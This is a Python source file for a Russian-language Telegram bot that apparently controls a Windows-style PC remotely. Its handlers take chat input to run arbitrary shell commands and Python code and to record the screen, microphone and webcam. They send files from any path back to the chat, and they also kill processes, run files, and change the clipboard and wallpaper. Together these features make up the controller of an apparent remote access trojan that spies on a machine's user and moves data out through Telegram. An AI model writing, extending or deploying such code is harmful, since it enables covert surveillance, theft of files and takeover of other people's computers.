from commands import *
from aiogram import Bot
from aiogram.types import Message
from aiogram.fsm.context import FSMContext
from states import *
from utils import send_safe_message, send_safe_document, send_file_and_cleanup


async def handle_states(message: Message, bot: Bot, state: FSMContext, command: str):
    """Обрабатывает все машины состояний"""
    chat_id = message.chat.id
    current_state = await state.get_state()

    # MoveMouseCoord
    if current_state == MoveMouseCoord.waiting_for_coords.state:
        await state.clear()
        parts = command.split()
        if len(parts) == 2:
            try:
                x, y = int(parts[0]), int(parts[1])
                response = move_mouse_coord(x, y)
            except:
                response = '❌ Введите два числа: x и y'
        else:
            response = '❌ Введите координаты через пробел: x y'
        await send_safe_message(bot, chat_id, response)
        return True

    # MoveMouseDirection
    elif current_state == MoveMouseDirection.waiting_for_direction.state:
        direction = command.lower()
        if direction in ['левее', 'правее', 'выше', 'ниже']:
            await state.update_data(direction=direction)
            await state.set_state(MoveMouseDirection.waiting_for_offset)
            await send_safe_message(bot, chat_id, f'📏 На сколько пикселей {direction}?')
        else:
            await state.clear()
            await send_safe_message(bot, chat_id, '❌ Направление должно быть: левее, правее, выше, ниже')
        return True

    elif current_state == MoveMouseDirection.waiting_for_offset.state:
        data = await state.get_data()
        direction = data.get('direction')
        await state.clear()
        try:
            offset = int(command)
            result = move_mouse_direction(direction, offset)
            response = result if result else f'❌ Ошибка перемещения'
        except:
            response = '❌ Введите число'
        await send_safe_message(bot, chat_id, response)
        return True

    # MsgBox
    elif current_state == MsgBox.waiting_for_text.state:
        await state.clear()
        response = msg_box(command)
        await send_safe_message(bot, chat_id, response)
        return True

    # MessageWrite
    elif current_state == MessageWrite.waiting_for_text.state:
        await state.clear()
        response = message_write(command)
        await send_safe_message(bot, chat_id, response)
        return True

    # CmdExec
    elif current_state == CmdExec.waiting_for_command.state:
        await state.clear()
        result = execute_cmd(command)
        temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(result)
        await send_file_and_cleanup(bot, chat_id, temp_path)
        await send_safe_message(bot, chat_id, result[:700])
        return True

    # PythonExec
    elif current_state == PythonExec.waiting_for_code.state:
        await state.clear()
        path, result = python_exec(command)
        if path:
            await send_file_and_cleanup(bot, chat_id, path)
        else:
            await send_safe_message(bot, chat_id, result)
        return True

    # VideoPc
    elif current_state == VideoPc.waiting_for_seconds.state:
        await state.clear()
        try:
            seconds = min(int(command), 500)
            path, response = record_screen(seconds)
            await send_file_and_cleanup(bot, chat_id, path)
        except:
            response = '❌ Введите число секунд'
        await send_safe_message(bot, chat_id, response)
        return True

    # Download
    elif current_state == Download.waiting_for_path.state:
        await state.clear()
        file_path = download_file(command)
        if file_path:
            await send_safe_document(bot, chat_id, file_path)
        else:
            await send_safe_message(bot, chat_id, f'❌ Файл не найден: {command}')
        return True

    # ClipboardSet
    elif current_state == ClipboardSet.waiting_for_text.state:
        await state.clear()
        response = set_clipboard_text(command)
        await send_safe_message(bot, chat_id, response)
        return True

    # KillProcess
    elif current_state == KillProcess.waiting_for_pid.state:
        await state.clear()
        try:
            pid = int(command)
            response = kill_process_by_pid(pid)
        except ValueError:
            response = '❌ Введите число (PID)'
        except Exception as e:
            response = f'❌ Ошибка: {e}'
        await send_safe_message(bot, chat_id, response)
        return True

    # MicRecord
    elif current_state == MicRecord.waiting_for_seconds.state:
        await state.clear()
        try:
            seconds = min(int(command), 300)  # максимум 5 минут
            path, response = record_audio(seconds)
            if path:
                await send_safe_document(bot, chat_id, path)
                os.remove(path)
            else:
                await send_safe_message(bot, chat_id, response)
        except:
            await send_safe_message(bot, chat_id, '❌ Введите число секунд')
        return True

    # Run
    elif current_state == Run.waiting_for_path.state:
        await state.clear()
        response = run_file(command)
        await send_safe_message(bot, chat_id, response)
        return True

    # Wallpaper
    elif current_state == Wallpaper.waiting_for_path.state:
        await state.clear()
        response = set_wallpaper(command)
        await send_safe_message(bot, chat_id, response)
        return True

    # Ls
    elif current_state == Ls.waiting_for_path.state:
        await state.clear()
        if command.lower() == 'enter' or command == '':
            path = os.getcwd()
        else:
            path = command
        response = list_directory(path)
        await send_safe_message(bot, chat_id, response[:4000])
        return True

    # OpenBrowser
    elif current_state == OpenBrowser.waiting_for_url.state:
        await state.clear()
        response = open_browser(command if command else None)
        await send_safe_message(bot, chat_id, response)
        return True

    # CreateMoreFolders
    elif current_state == CreateMoreFolders.waiting_for_count.state:
        try:
            count = int(command)
            await state.update_data(count=count)
            await state.set_state(CreateMoreFolders.waiting_for_name)
            await send_safe_message(bot, chat_id, '📁 Введите базовое имя папок:')
        except:
            await state.clear()
            await send_safe_message(bot, chat_id, '❌ Введите число')
        return True

    elif current_state == CreateMoreFolders.waiting_for_name.state:
        await state.update_data(name=command)
        await state.set_state(CreateMoreFolders.waiting_for_text)
        await send_safe_message(bot, chat_id, '📝 Введите текст для заполнения файлов:')
        return True

    elif current_state == CreateMoreFolders.waiting_for_text.state:
        data = await state.get_data()
        await state.clear()
        response = create_desktop_folders(data['count'], data['name'], command)
        await send_safe_message(bot, chat_id, response)
        return True

    # DownloadFile
    elif current_state == DownloadFile.waiting_for_file.state:
        await state.clear()
        await send_safe_message(bot, chat_id, '❌ Отправьте файл, а не текст')
        return True

    # WebcamRecord
    elif current_state == WebcamRecord.waiting_for_seconds.state:
        await state.clear()
        try:
            seconds = min(int(command), 60)
            path, response = record_webcam(seconds)
            if path:
                await send_safe_document(bot, chat_id, path)
                os.remove(path)
            else:
                await send_safe_message(bot, chat_id, response)
        except:
            await send_safe_message(bot, chat_id, '❌ Введите число секунд')
        return True

    # ClickImage
    elif current_state == ClickImage.waiting_for_photo.state:
        await state.clear()
        await send_safe_message(bot, chat_id, '❌ Отправьте фото, а не текст')
        return True

    return False



